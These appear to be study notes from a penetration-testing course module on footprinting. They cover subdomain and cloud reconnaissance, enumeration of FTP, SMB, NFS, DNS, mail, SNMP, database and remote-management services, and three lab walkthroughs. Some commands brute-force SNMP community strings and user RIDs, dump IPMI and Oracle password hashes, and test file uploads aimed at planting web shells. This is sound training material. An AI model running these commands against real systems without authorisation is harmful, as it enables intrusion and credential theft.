# Footprinting

1. [Intro](#intro)
1. [Infrastructure-based Enumeration](#infrastructure-based-enumeration)
1. [Host-based Enumeration](#host-based-enumeration)
1. [Remote Management Protocols](#remote-management-protocols)
1. [Skills Assessment](#skills-assessment)

## Intro

* Enumeration - information gathering using active & passive methods

* Static enumeration methodology:

![Static enumeration methodology](enum-method3.png)

## Infrastructure-based Enumeration

* Domain information:

  * gathering info passively, to understand the company's functionality, structure, etc.

  * understand online presence using resources like SSL certificates and [crt.sh](https://crt.sh/):

    ```sh
    # get unique subdomains from crt.sh for website
    curl -s https://crt.sh/\?q\=inlanefreight.com\&output\=json | jq . | grep name | cut -d":" -f2 | grep -v "CN=" | cut -d'"' -f2 | awk '{gsub(/\\n/,"\n");}1;' | sort -u | tee subdomainlist

    # then, identify hosts directly accessible from Internet
    for i in $(cat subdomainlist);do host $i | grep "has address" | grep inlanefreight.com | cut -d" " -f1,4;done
    ```
  
  * use [Shodan](https://www.shodan.io/) to find devices & systems permanently connected to Internet:

    ```sh
    for i in $(cat subdomainlist);do host $i | grep "has address" | grep inlanefreight.com | cut -d" " -f4 >> ip-addresses.txt;done

    for i in $(cat ip-addresses.txt);do shodan host $i;done
    ```
  
  * check available DNS records:

    ```sh
    dig any inlanefreight.com
    ```

* Cloud resources:

  * cloud storage can be found in subdomains; it is possible to find cloud service provider domains during IP lookup phase

  * we can also use Google dorks like ```intext:companyname inurl:amazonaws.com``` (AWS) and ```intext:companyname inurl:blob.core.windows.net``` (Azure)

  * we can check source code as well for any mentions

  * 3rd party providers such as [domain.glass](https://domain.glass/) and [GrayHatWarfare](https://buckets.grayhatwarfare.com/) can also be used to search for different cloud service providers and files like SSH keys

* Staff:

  * employees can be identified on networking websites like [LinkedIn](https://www.linkedin.com/) or [Xing](https://www.xing.de/)

  * from staff profile, we can view for linked sites such as their GitHub page, personal projects, etc.

## Host-based Enumeration

* FTP (File Transfer Protocol):

  * cleartext protocol; runs within application layer of TCP/IP stack (same layer as HTTP or POP)
  
  * for FTP connection, client & server establish control channel through TCP/21 first - client sends commands to server, and server returns status codes - then both can establish data channel via TCP/20

  * FTP can be in active (client informs server for control channel port) or passive (server informs client for data channel port) mode

  * TFTP (Trivial FTP) - simpler than FTP, uses UDP instead of TCP and does not supported user authentication and access control methods (supported in FTP)

  * ```vsFTPd``` is a commonly used FTP server in Linux systems; the config can be found in ```/etc/vsftpd.conf```; to deny certain users access to FTP, add them to ```/etc/ftpusers```

  * dangerous settings:

    * ```anonymous_enable=YES```
    * ```anon_upload_enable=YES```
    * ```anon_mkdir_write_enable=YES```
    * ```no_anon_password=YES```
    * ```anon_root=/home/username/ftp```
    * ```write_enable=YES```
  
  * example:

    ```sh
    ftp 10.129.14.136
    # attempt anonymous login
    
    # after getting logged in
    ls

    # get overview of server settings
    status

    # for detailed output, we can use 'debug' and 'trace'
    debug

    trace

    ls
    # now we get to see more information

    # if hide_ids=YES in config
    # we cannot identify user and group info as it will be shown as 'ftp'

    ls -R
    # recursive listing, if it is enabled

    # to download a file 'Important Notes.txt'
    get Important\ Notes.txt

    # to download all available files
    wget -m --no-passive ftp://anonymous:anonymous@10.129.14.136

    touch testupload.txt
    # create a test file

    # in ftp server, after logging in
    # test if file upload is allowed
    put testupload.txt

    ls
    # if it is allowed, we can upload FTP reverse shells
    ```
  
  * footprinting:

    ```sh
    sudo nmap --script-updatedb
    # update nmap

    find / -type f -name ftp* 2>/dev/null | grep scripts
    # list NSE scripts for ftp

    sudo nmap -sV -p21 -sC -A 10.129.14.136
    # version scan, default script scan and aggressive scan on port 21

    sudo nmap -sV -p21 -sC -A 10.129.14.136 --script-trace
    # same command as above but with tracing progress of NSE scripts

    # service interaction
    nc -nv 10.129.14.136 21

    telnet 10.129.14.136 21

    # if FTP server runs with TLS/SSL encryption
    openssl s_client -connect 10.129.14.136:21 -starttls ftp
    ```

* SMB (Server Message Block):

  * client-server protocol for sharing files, directories & other network resources for Windows systems

  * Samba is the free alternative to SMB server for Unix systems; it implements the CIFS (Common Internet File System) protocol

  * NetBIOS (network basic input/output system) - API for networking; also used for SMB network

  * default config for Samba can be found at ```/etc/samba/smb.conf```

  * dangerous settings:

    * ```browseable = yes```
    * ```read only = no```
    * ```writable = yes```
    * ```guest ok = yes```
    * ```enable privileges = yes```
    * ```create mask = 0777```
    * ```directory mask = 0777```
    * ```logon script = script.sh```
    * ```magic script = script.sh```
    * ```magic output = script.out```
  
  * example:

    ```sh
    # connecting to share
    smbclient -N -L //10.129.14.128

    # connecting to specific share
    smbclient //10.129.14.128/notes

    # download files
    get prep-prod.txt

    # to execute commands in local system without interrupting connection
    # we need to use exclamation mark
    !ls

    !cat prep-prod.txt

    # on SMB server itself, we can check status
    smbstatus
    ```
  
  * footprinting:

    ```sh
    sudo nmap 10.129.14.128 -sV -sC -p139,445

    # we can also use other tools like rpcclient
    # this is used for RPC functions

    rpcclient -U "" 10.129.14.128

    # in rpcclient
    srvinfo

    enumdomains

    querydominfo

    netshareenumall

    netsharegetinfo notes
    # where notes is share name

    # user enumeration
    enumdomusers

    queryuser 0x3e9
    # user rid

    # the above can help us to identify group rid
    querygroup 0x201
    # group rid

    # bash one-liner to bruteforce user rids
    for i in $(seq 500 1100);do rpcclient -N -U "" 10.129.14.128 -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name\|user_rid\|group_rid" && echo "";done

    # alternative - samrdump.py from Impacket
    samrdump.py 10.129.14.128

    # we can also use other tools

    smbmap -H 10.129.14.128

    crackmapexec smb 10.129.14.128 --shares -u '' -p ''

    ./enum4linux-ng.py 10.129.14.128 -A
    ```

* NFS (Network File System):

  * similar to SMB, but it uses a different protocol (NFS) and is used between Unix-based systems

  * NFS protocol has no mechanism for authentication or authorization; authentication is shifted to RPC and authorization is derived from available file system info

  * ```/etc/exports``` contains table of physical filesystems on an NFS server; the file also includes examples of configuring NFS shares

  * dangerous settings:

    * ```rw```
    * ```insecure```
    * ```nohide```
    * ```no_root_squash```
  
  * footprinting:

    ```sh
    sudo nmap 10.129.14.128 -p111,2049 -sV -sC

    # run NSE scripts for NFS
    sudo nmap --script nfs* 10.129.14.128 -sV -p111,2049

    # show available NFS shares
    showmount -e 10.129.14.128
    # shows /mnt/nfs is available

    # mount NFS shares
    mkdir target-NFS

    sudo mount -t nfs 10.129.14.128:/ ./target-NFS/ -o nolock

    cd target-NFS

    tree .
    # view the mounted shares that we can access locally now
    # the files are in mnt/nfs/* structure

    # list contents with usernames and group names
    ls -l mnt/nfs/

    # list contents with UIDs and GUIDs
    ls -n mnt/nfs/

    # NFS can be used for privesc as well
    # example - if we have access to target via SSH
    # and we want to read files from another user directory
    # then we can upload shell to NFS share that has SUID of the target user
    # and run the shell via SSH user


    # unmount share
    cd ..

    sudo umount ./target-NFS
    ```

* DNS (Domain Name System):

  * for resolving domain names into IP addresses; this is done by globally distributed DNS servers

  * several types of DNS servers:

    * DNS root server
    * authoritative name server
    * non-authoritative name server
    * caching server
    * forwarding server
    * resolver
  
  * DNS is usually unencrypted, but there are safer options like DNS over TLS (DoT), DNS over HTTPS (DoH), or protocols such as DNSCrypt

  * different types of DNS records are used for the DNS queries:

    * A - returns IPv4 address of requested domain
    * AAAA - returns IPv6 address of requested domain
    * MX - returns responsible mail servers
    * NS - returns DNS servers (nameservers) of domain
    * TXT - contains various entries (e.g. - SPF, DMARC)
    * CNAME - serves as an alias domain name
    * PTR - for reverse lookup (converts IP into valid domain name)
    * SOA - provides info about corresponding DNS zone and email address of admin contact
  
  * all DNS servers work with 3 types of config files:

    * local DNS config files
    * zone files
    * reverse name resolution files
  
  * in Linux systems, Bind9 DNS server is commonly used; its local config file - ```named.conf``` - is divided into files ```named.conf.local```, ```named.conf.options``` and ```named.conf.log``` for different config

  * zone files, usually in BIND file format, describe a zone completely and includes forward records; found in format of ```/etc/bind/db.domain.com```

  * reverse name resolution zone files use PTR records; example file - ```/etc/bind/db.10.129.14```

  * dangerous settings:

    * ```allow-query```
    * ```allow-recursion```
    * ```allow-transfer```
    * ```zone-statistics```
  
  * footprinting:

    ```sh
    # NS query with DNS server specified
    dig ns inlanefreight.htb @10.129.14.128

    # version query
    dig CH TXT version.bind 10.129.120.85

    # ANY to view all available records
    dig any inlanefreight.htb @10.129.14.128

    # AXFR zone transfer
    dig axfr inlanefreight.htb @10.129.14.128

    # AXFR zone transfer - internal
    dig axfr internal.inlanefreight.htb @10.129.14.128

    # fetch SOA record
    dig soa www.inlanefreight.com

    # subdomain brute forcing
    for sub in $(cat /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt);do dig $sub.inlanefreight.htb @10.129.14.128 | grep -v ';\|SOA' | sed -r '/^\s*$/d' | grep $sub | tee -a subdomains.txt;done

    # we can use other tools like DNSenum for the same
    dnsenum --dnsserver 10.129.14.128 --enum -p 0 -s 0 -o subdomains.txt -f /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt inlanefreight.htb
    ```

* SMTP (Simple Mail Transfer Protocol):

  * protocol for sending emails; can be used between an email client & an outgoing mail server, or between 2 SMTP servers

  * SMTP is often used with IMAP or POP3 protocols

  * SMTP is unencrypted by default and works on TCP/25, but newer servers which use SMTP with SSL/TLS encryption use TCP/465 or TCP/587 commonly

  * SMTP prevents spam using authentication mechanism - for this it supports ESTMP (extended SMTP, uses TLS) with SMTP-Auth

  * example flow of email:

    ```text
    Client/MUA (Mail User Agent) -> Submission Agent/MSA (Mail Submission Agent) -> Open Relay/MTA (Main Transfer Agent) -> MDA (Mail Delivery Agent) -> Mailbox (POP3/IMAP)
    ```
  
  * commonly default config can be found at ```/etc/postfix/main.cf```

  * example:

    ```sh
    # interact with SMTP server
    # init with HELO or EHLO

    telnet 10.129.14.128 25

    HELO mail1.inlanefreight.htb

    EHLO mail1

    # both return valid responses if they exist

    # try to verify users
    VRFY root

    VRFY testuser
    # this does not work always, so test values

    # send an email
    MAIL FROM: <admin@inlanefreight.htb>

    RCPT TO: <user@inlanefreight.htb>

    DATA

    From: <admin@inlanefreight.htb>
    To: <user@inlanefreight.htb>
    Subject: Test
    Date: Mon, 15 May 2023 04:15:00 +0500
    Test body for email

    QUIT
    ```
  
  * dangerous settings:

    * ```mynetworks=0.0.0.0/0``` - open relay config; SMTP server can send fake emails and initialize session between multiple parties
  
  * footprinting:

    ```sh
    sudo nmap 10.129.14.128 -sC -sV -p25

    # check for open relay
    sudo nmap 10.129.14.128 -p25 --script smtp-open-relay -v

    # enumerate smtp users
    msfconsole

    use auxiliary/scanner/smtp/smtp_enum
    # set options and run
    ```

* IMAP/POP3:

  * IMAP (Internet Message Access Protocol) improves upon POP3 (Post Office Protocol); unlike the latter, IMAP allows online management of emails directly on server and supports folder structure

  * POP3 only provides listing, retrieving, and deleting emails at email server

  * IMAP works unencrypted on TCP/143, but can be used with SSL/TLS on TCP/143 or TCP/993

  * dangerous settings:

    * ```auth_debug```
    * ```auth_debug_passwords```
    * ```auth_verbose```
    * ```auth_verbose_passwords```
    * ```auth_anonymous_username```

  * footprinting:

    ```sh
    sudo nmap 10.129.14.128 -sV -p110,143,993,995 -sC
    # if server uses an embedded SSL cert
    # we can get common name and organization details

    # if we have creds for a user
    curl -k 'imaps://10.129.14.128' --user user:p4ssw0rd

    curl -k 'imaps://10.129.14.128' --user cry0l1t3:1234 -v
    # verbose logs to show TLS version, SSL cert details and mail server version from banner

    # interact with IMAP or POP3 over SSL
    openssl s_client -connect 10.129.14.128:pop3s

    openssl s_client -connect 10.129.14.128:imaps

    # after logging into IMAPS

    1 LOGIN username password

    1 LIST "" *
    # lists all folders

    # we have to check the ones with the '\HasNoChildren' flag set
    1 SELECT DEV.DEPARTMENT.INT

    # we have 1 email here

    1 FETCH 1 RFC822
    # fetch complete email
    # where 1 is the id of the email in folder
    # and RFC822 is format
    ```

* SNMP (Simple Network Management Protocol):

  * protocol for monitoring & managing network devices remotely; uses UDP/161 (for commands) and UDP/162 (for traps)

  * in classic use case, client actively requests info from server, but SNMP traps allow server to send data to client based on certain events

  * MIB (Management Information Base) is an independent format for storing device info; it contains all queryable SNMP objects of a device in a standard tree hierarchy

  * MIB contains at least one OID (Object Identifier), which has a unique address (and name) and is associated with type, access rights and description of the SNMP object

  * OID represents a node in a hierarchical namespace and is written in dot notation; a number sequence to uniquely identify each node in tree

  * SNMP versions:

    * SNMPv1 - supports fetching info from (and configuring) devices, and provides traps; but no built-in authentication mechanism and no encryption
    * SNMPv2 - has different versions but 'v2c' ('c' represents community-based SNMP) is most common; community string (which provides security) is sent in plaintext
    * SNMPv3 - authentication using username/password and transmission encryption supported; but more complex
  
  * default config can be found at ```/etc/snmp/snmpd.conf``` usually

  * dangerous settings:

    * ```rwuser noauth```
    * ```rwcommunity 'community string' 'IPv4 address'```
    * ```rwcommunity6 'community string' 'IPv6 address'```
  
  * footprinting:

    ```sh
    # snmpwalk is used to query OIDs with info
    # here 'public' is the community string
    snmpwalk -v2c -c public 10.129.14.128

    # we can query internal system info
    # if we know community string
    # and SNMP service does not require authentication

    # if we do not know community string, we can try to bruteforce it
    sudo apt install onesixtyone

    onesixtyone -c /usr/share/wordlists/seclists/Discovery/SNMP/snmp.txt 10.129.14.128

    # if we have a hostname to be identified
    # we can check for a pattern
    # and create custom wordlists using crunch

    # we can also use braa to bruteforce
    sudo apt install braa

    braa public@10.129.14.128:.1.3.6.*
    ```

* MySQL:

  * open-source SQL RDBMS developed by Oracle; it works according to client-server model

  * MySQL clients (like WordPress) can retrieve & edit data using structured queries to the DB
  
  * default config can be found at ```/etc/mysql/mysql.conf.d/mysqld.cnf```

  * dangerous settings:

    * ```user```
    * ```password```
    * ```admin_address```
    * ```debug```
    * ```sql_warnings```
    * ```secure_file_priv```
  
  * footprinting:

    ```sh
    sudo nmap 10.129.14.128 -sV -sC -p3306 --script mysql*

    # interact with server
    mysql -u root -h 10.129.14.132

    # if we have password
    mysql -u root -pP4SSw0rd -h 10.129.14.128
    # no space between -p switch and password

    # after logging in to MySQL
    show databases;

    select version();

    use sys;

    show tables;

    select host, unique_users from host_summary;
    ```

* MSSQL:

  * Microsoft's SQL-based RDBMS; closed-source and seen on Windows machines commonly

  * SSMS (SQL Server Management Studio) used as MSSQL client usually; on Linux, we can use Impacket's ```mssqlclient```

  * SQL service likely run as ```NT SERVICE\MSSQLSERVER```

  * dangerous settings:

    * MSSQL clients not using encryptions to connect to server
    * use of self-signed certificates in encryption; these can be spoofed
    * use of named pipes
    * weak & default ```sa``` (system admin) creds
  
  * footprinting:

    ```sh
    sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 10.129.201.248

    # we can also use metasploit modules
    msfconsole

    use scanner/mssql/mssql_ping
    # set the options and run the module

    # we can remotely connect to server if we have creds
    # using Impacket mssqlclient.py
    python3 mssqlclient.py Administrator@10.129.201.248 -windows-auth

    # enumerate
    select name from sys.databases
    ```

* Oracle TNS (Transparent Network Substrate):

  * communication protocol between Oracle DBs and apps over networks

  * TNS listener, which by default listens on TCP/1521, supports various protocols like TCP/IP, IPX/SPX, and AppleTalk

  * config files are called ```tnsnames.ora``` and ```listener.ora```; usually located in ```$ORACLE_HOME/network/admin```

  * Oracle 9 has a default password 'CHANGE_ON_INSTALL', and Oracle DBSNMP uses default password 'dbsnmp'

  * script for setting up Oracle tools:

    ```sh
    #!/bin/bash

    sudo apt-get install libaio1 python3-dev alien -y
    git clone https://github.com/quentinhardy/odat.git
    cd odat/
    git submodule init
    git submodule update
    wget https://download.oracle.com/otn_software/linux/instantclient/2112000/instantclient-basic-linux.x64-21.12.0.0.0dbru.zip
    unzip instantclient-basic-linux.x64-21.12.0.0.0dbru.zip
    wget https://download.oracle.com/otn_software/linux/instantclient/2112000/instantclient-sqlplus-linux.x64-21.12.0.0.0dbru.zip
    unzip instantclient-sqlplus-linux.x64-21.12.0.0.0dbru.zip
    export LD_LIBRARY_PATH=instantclient_21_12:$LD_LIBRARY_PATH
    export PATH=$LD_LIBRARY_PATH:$PATH
    pip3 install cx_Oracle
    sudo apt-get install python3-scapy -y
    sudo pip3 install colorlog termcolor passlib python-libnmap
    sudo apt-get install build-essential libgmp-dev -y
    pip3 install pycryptodome
    ```

    ```sh
    # to test installation
    ./odat.py -h
    ```
  
  * ODAT (Oracle DB Attacking Tool) can be used to enumerate and exploit Oracle DB vulnerabilities

  * footprinting:

    ```sh
    sudo nmap -p1521 -sV 10.129.204.235 --open

    # SID - system identifier
    # used in Oracle RDBMS to identify DB instances

    # bruteforce SIDs using nmap
    sudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute

    # run all modules in odat
    ./odat.py all -s 10.129.204.235

    # if we have valid creds
    # connect to Oracle DB
    sqlplus scott/tiger@10.129.204.235/XE

    # in SQLplus
    select table_name from all_tables;

    select * from user_role_privs;

    # we can also test if a certain user has sysdba access
    # for higher privilege
    sqlplus scott/tiger@10.129.204.235/XE as sysdba

    # if our user has enough privileges, we can extract hashes from database
    select name, password from sys.user$;

    # we can also try web shell upload
    # this needs target server to run a webserver

    echo "Oracle File Upload Test" > testing.txt

    ./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt
    # if in Linux, we can test /var/www/html as webroot directory

    curl -X GET http://10.129.204.235/testing.txt
    # shows if file upload worked
    ```

* IPMI (Intelligent Platform Management Interface):

  * set of standard specifications for hardware-based host management systems

  * used to manage & monitor systems, even if they're powered off or unresponsive; uses a direct network connection to system hardware

  * systems that use IPMI protocol are called BMCs (Baseboard Management Controllers) - typically implemented as embedded ARM systems running Linux, connected directly to host motherboard

  * unique but default passwords are common, such as 'root:calvin' in Dell, 'Administrator:<8-char string with digits and uppercase letters>' in HP, and 'ADMIN:ADMIN' in Supermicro BMCs

  * footprinting:

    ```sh
    sudo nmap -sU --script ipmi-version -p 623 ilo.inlanfreight.local

    # we can use metasploit scanner modules
    msfconsole

    use auxiliary/scanner/ipmi/ipmi_version
    # set required options and run the scanner

    use auxiliary/scanner/ipmi/ipmi_dumphashes
    # module to retrieve IPMI hashes
    # this exploits a flaw in IPMI 2.0 RAKP protocol
    ```

## Remote Management Protocols

* Linux remote management protocols:

  * SSH (Secure Shell):

    * encrypted direct connection on TCP/22; used to send commands to target system, transfer files or do port forwarding as well

    * OpenSSH supports many authentication methods - public key authentication is a common method:

      * SSH server sends certificate to client to verify
      * after server authentication, client also proves that it has access authorization, usually in form of public/private keypair
      * private key is stored on client machine
      * server creates a cryptographic problem with client's public key and sends it to client
      * client decrypts the problem with its private key and sends solution to establish connection

    * default config can be found at ```/etc/ssh/sshd_config```

    * dangerous settings:

      * ```PasswordAuthentication yes```
      * ```PermitEmptyPasswords yes```
      * ```PermitRootLogin yes```
      * ```Protocol 1```
      * ```X11Forwarding yes```
      * ```AllowTcpForwarding yes```
      * ```PermitTunnel```
      * ```DebianBanner yes```

    * footprinting:

      ```sh
      # ssh-audit tool to fingerprint SSH config
      git clone https://github.com/jtesta/ssh-audit.git && cd ssh-audit

      ./ssh-audit.py 10.129.14.132

      # attempt SSH login
      # -v shows debug logs which includes supported authentication methods
      ssh -v cry0l1t3@10.129.14.132

      # change authentication method
      # useful for potential bruteforce attacks
      ssh -v cry0l1t3@10.129.14.132 -o PreferredAuthentications=password
      ```
  
  * Rsync:

    * used for locally & remotely copying files; often used for backups & mirroring

    * footprinting:

      ```sh
      sudo nmap -sV -p 873 127.0.0.1

      # check for accessible shares
      nc -nv 127.0.0.1 873

      # enumerating an open share 'dev'
      rsync -av --list-only rsync://127.0.0.1/dev

      # sync all files to attack machine
      rsync -av rsync://127.0.0.1/dev

      # if rsync is configured to use SSH for file transfer
      # use '-e ssh' flag
      ```
  
  * R-Services:

    * suite of services for enabling remote access or issuing commands between Unix systems

    * R-services used in ports 512, 513 & 514; accessible only through a suite of programs called ```r-commands```, which contains the following:

      * rcp (remote copy)
      * rexec (remote execution)
      * rlogin (remote login)
      * rsh (remote shell)
      * rstat
      * ruptime
      * rwho (remote who)

    * ```/etc/hosts.equiv``` contains list of trusted hosts and is used to grant access to other systems

    * footprinting:

      ```sh
      sudo nmap -sV -p 512,513,514 10.0.17.2

      # logging in using rlogin
      rlogin 10.0.17.2 -l htb-student

      rwho
      # list authenticated users

      # more info on authenticated users
      rusers -al 10.0.17.5
      ```

* Windows remote management protocols:

  * RDP (Remote Desktop Protocol):

    * remote encrypted GUI protocol

    * footprinting:

      ```sh
      nmap -sV -sC 10.129.201.248 -p3389 --script rdp*

      # can track individual packets for further inspection
      nmap -sV -sC 10.129.201.248 -p3389 --packet-trace --disable-arp-ping -n

      # we can also use other scripts like rdp-sec-check.pl
      # which can identify security settings of RDP servers

      git clone https://github.com/CiscoCXSecurity/rdp-sec-check.git && cd rdp-sec-check

      ./rdp-sec-check.pl 10.129.201.248

      # if we have creds, we can initiate a RDP session
      xfreerdp /u:cry0l1t3 /p:"P455w0rd!" /v:10.129.201.248
      ```

  * WinRM (Windows Remote Management):

    * remote management CLI protocol; uses SOAP (Simple Object Access Protocol) to establish connections

    * footprinting:

      ```sh
      nmap -sV -sC 10.129.201.248 -p5985,5986 --disable-arp-ping -n

      # interact with WinRM using evil-winrm tool
      evil-winrm -i 10.129.201.248 -u Cry0l1t3 -p P455w0rD!
      ```
  
  * WMI (Windows Management Instrumentation):

    * allows read-write access to settings on Windows systems; used for administration & remote maintenance

    * footprinting:

      ```sh
      # using wmiexec.py from Impacket
      /usr/share/doc/python3-impacket/examples/wmiexec.py Cry0l1t3:"P455w0rD!"@10.129.201.248 "hostname"
      ```

## Skills Assessment

* Footprinting Lab - Easy:

  * Given, an internal DNS server to be checked, and the creds "ceil:qwer1234"

  * We can start with a ```nmap``` scan for top ports:

    ```sh
    nmap -T4 -A -Pn -v 10.129.42.195
    ```
  
  * Open ports & services:

    * 21/tcp - ftp - gives domain 'ftp.int.inlanefreight.htb'
    * 22/tcp - ssh
    * 53/tcp - domain
    * 2121/tcp - ftp - Ceil's FTP
  
  * Starting with FTP:

    ```sh
    ftp 10.129.42.195
    # anonymous login does not work

    # we can check with known creds for ceil
    # it works

    ls -la
    # we do not have any files

    quit

    # checking on other ftp port
    ftp 10.129.42.195 2121
    # here, we can use ceil creds

    # this works and we have some files here
    # we can fetch these files and check further

    wget -m --no-passive ftp://ceil:qwer1234@10.129.42.195:2121
    ```
  
  * The '.bash_history' file mentions a 'flag.txt' file
  
  * From the fetched files, we have a ```id_rsa``` key - we can try to log into SSH using the creds and this file:

    ```sh
    chmod 600 id_rsa

    ssh ceil@10.129.42.195 -i id_rsa
    # the login works

    # we need to find the flag.txt file
    find / -type f -name flag.txt 2>/dev/null

    cat /home/flag/flag.txt
    ```

* Footprinting Lab - Medium:

  * Given, we have a server and an user 'HTB', whose credentials need to be found

  * Starting with ```nmap``` scan:

    ```sh
    nmap -T4 -p- -A -Pn -v 10.129.202.41
    ```
  
  * Open ports & services:

    * 111/tcp - rpcbind
    * 135/tcp - msrpc
    * 139/tcp - netbios-ssn
    * 445/tcp - microsoft-ds
    * 2049/tcp - mountd
    * 3389/tcp - ms-wbt-server
    * 5985/tcp - http
    * 47001/tcp - http
  
  * SMB enumeration:

    ```sh
    rpcclient -U "" 10.129.202.41

    samrdump.py 10.129.202.41

    /opt/enum4linux-ng/enum4linux-ng.py 10.129.202.41 -A
    # nothing works
    ```
  
  * SMB enumeration does not give us anything here due to login failure

  * NFS enumeration:

    ```sh
    sudo nmap --script nfs* 10.129.202.41 -sV -p111,2049
    ```
  
  * The NSE script ```nfs-showmount``` shows that we have a share 'TechSupport' - and this includes some tickets in .txt form:

    ```sh
    showmount -e 10.129.202.41
    # we can try to access this TechSupport share

    sudo mount -t nfs 10.129.202.41:/ ./targetbox/ -o nolock

    cd targetbox/

    tree .
    # we get an error related to permissions

    sudo tree .
    # this works

    # we can copy these to our local directory
    mkdir ~/tickets

    sudo cp -r TechSupport/ ~/tickets

    sudo ls -la ~/tickets/TechSupport
    # we have several tickets, but only one has non-zero size

    sudo cat ~/tickets/TechSupport/ticket4238791283782.txt
    # enumerate ticket

    # unmount share
    cd ..

    sudo umount ./targetbox
    ```
  
  * From the ticket file, we get an user 'alex' with email <alex.g@web.dev.inlanefreight.htb>; furthermore, we get a smtp web config file:

    ```ini
    smtp {
        host=smtp.web.dev.inlanefreight.htb
        #port=25
        ssl=true
        user="alex"
        password="lol123!mD"
        from="alex.g@web.dev.inlanefreight.htb"
    }

    securesocial {
        
        onLoginGoTo=/
        onLogoutGoTo=/login
        ssl=false
        
        userpass {      
          withUserNameSupport=false
          sendWelcomeEmail=true
          enableGravatarSupport=true
          signupSkipLogin=true
          tokenDuration=60
          tokenDeleteInterval=5
          minimumPasswordLength=8
          enableTokenJob=true
          hasher=bcrypt
    }

        cookie {
        #       name=id
        #       path=/login
        #       domain="10.129.2.59:9500"
                httpOnly=true
                makeTransient=false
                absoluteTimeoutInMinutes=1440
                idleTimeoutInMinutes=1440
        }   
    ```
  
  * While SMTP is not used in this box, this config file gives us the creds "alex:lol123!mD"

  * We can try these creds for RPC enumeration again:

    ```sh
    rpcclient -U 'alex%lol123!mD' 10.129.202.41
    # % is used as delimiter here
    # this works

    srvinfo
    # only this works
    # other commands give disconnected error

    # we can check other tools
    crackmapexec smb 10.129.202.41 --shares -u 'alex' -p 'lol123!mD'
    # this does not work as well

    /opt/enum4linux-ng/enum4linux-ng.py 10.129.202.41 -A -u 'alex' -p 'lol123!mD'
    ```
  
  * Using ```enum4linux-ng.py``` tool, we get info for domain 'INFREIGHT'; we also get a few shares listed - the ones to which we have access are 'Users' and 'devshare':

    ```sh
    smbclient //10.129.202.41/devshare -U alex
    # the password works

    ls
    # we have only 1 file

    get important.txt

    exit

    # access the other share
    smbclient //10.129.202.41/Users -U alex
    # this also works

    ls
    # we have several files and directories

    recurse
    # turns recursive listing on

    ls
    # now we can see contents of all directories
    # this gives a lot of files so it takes some time
    # nothing useful found

    cat important.txt
    ```
  
  * The file from 'devshare' gives us the creds "sa:87N1ns@slls83"

  * The username 'sa' seems to be related to MSSQL - but we do not have MSSQL service from ```nmap``` scan

  * Since we have port 3389 open, we can try these 2 creds that we have enumerated so far for RDP:

    ```sh
    # we can try remote session using xfreerdp or remmina
    remmina
    # opens GUI

    # we can check RDP to 10.129.202.41
    # using both usernames and passwords - 4 possible combinations
    # and domain 'INFREIGHT'

    # creds "alex:lol123!mD" works
    ```
  
  * Once we get RDP session for Alex, we can see a shortcut for MSSQL on Desktop

  * As we already have credentials for 'sa' user, we can try those creds here

  * The credentials do not work unless we open the application shortcut 'as Administrator' - here we can use the same password as 'sa'

  * Browsing the SQL server, we have a database 'accounts' - if we navigate to the Tables sub-folder, we have a 'dbo.devsacc' object, which includes Columns - 'id', 'name' and 'password'

  * We can use a query to get the password:

    ```sql
    SELECT name,password FROM dbo.devsacc WHERE name = 'HTB';
    ```

* Footprinting Lab - Hard:

  * Given, we have a server with internal accounts; we need to find credentials for user 'HTB'

  * ```nmap``` scan:

    ```sh
    nmap -T4 -p- -A -Pn -v 10.129.202.20
    ```
  
  * Open ports & services:

    * 22/tcp - ssh
    * 110/tcp - pop3
    * 143/tcp - imap
    * 993/tcp - ssl/imap
    * 995/tcp - ssl/pop3
  
  * We can start by enumerating IMAP/POP3:

    ```sh
    nmap 10.129.202.20 -sV -p110,143,993,995 -sC

    openssl s_client -connect 10.129.202.20:pop3s
    # connect over ssl

    openssl s_client -connect 10.129.202.20:imaps
    # we can see cert details only
    ```
  
  * As we do not have any credentials, we cannot log into these yet

  * The only cert details we get from ```nmap``` enumeration are "commonName=NIXHARD" and "Subject Alternative Name: DNS:NIXHARD"

  * Since there is nothing to be done here, we can check UDP ports once:

    ```sh
    sudo nmap 10.129.202.20 -sU -Pn -v
    # UDP scan only for top ports
    ```
  
  * We get a SNMP server running on port 161, we can check this further:

    ```sh
    snmpwalk -v2c -c public 10.129.202.20
    # public is not the correct community string

    # we can bruteforce this further using onesixtyone
    onesixtyone -c /usr/share/wordlists/seclists/Discovery/SNMP/snmp.txt 10.129.202.20
    # this works
    # and we get the community string 'backup'

    # snmpwalk
    snmpwalk -v2c -c backup 10.129.202.20
    ```
  
  * From ```snmpwalk```, we get admin email <tech@inlanefreight.htb>; we also get the string "tom NMds732Js2761" which could be valid creds

  * We can enumerate IMAP/POP3 again with these creds:

    ```sh
    openssl s_client -connect 10.129.202.20:imaps

    1 LOGIN tom NMds732Js2761
    # this works

    1 LIST "" *
    # view all folders
    # we have a few folders here

    1 SELECT Notes
    # 0 EXISTS
    # no content inside
    
    1 UNSELECT Notes

    # similarly check other folders

    1 SELECT Inbox
    # 1 EXISTS

    1 FETCH 1 RFC822
    # fetch 1st mail
    ```
  
  * The email, sent from Admin <tech@inlanefreight.htb> to Tom <tom@inlanefreight.htb> with the subject 'Key', contains an ```id_rsa``` key - we can copy this to our system and try SSH login

    ```sh
    vim id_rsa
    # paste key

    chmod 600 id_rsa

    ssh tom@10.129.202.20 -i id_rsa
    # we are able to login

    ls -la
    # we can check the history files

    cat .bash_history

    cat .mysql_history
    ```
  
  * The file ```.mysql_history``` shows the string "_HiStOrY_V2_" - we can check this as a password as well for ```mysql``` login:

    ```sh
    mysql -u tom -p
    # use above password
    # it works

    show databases;

    use users;

    show tables;
    # users

    select * from users;
    # get HTB password
    ```
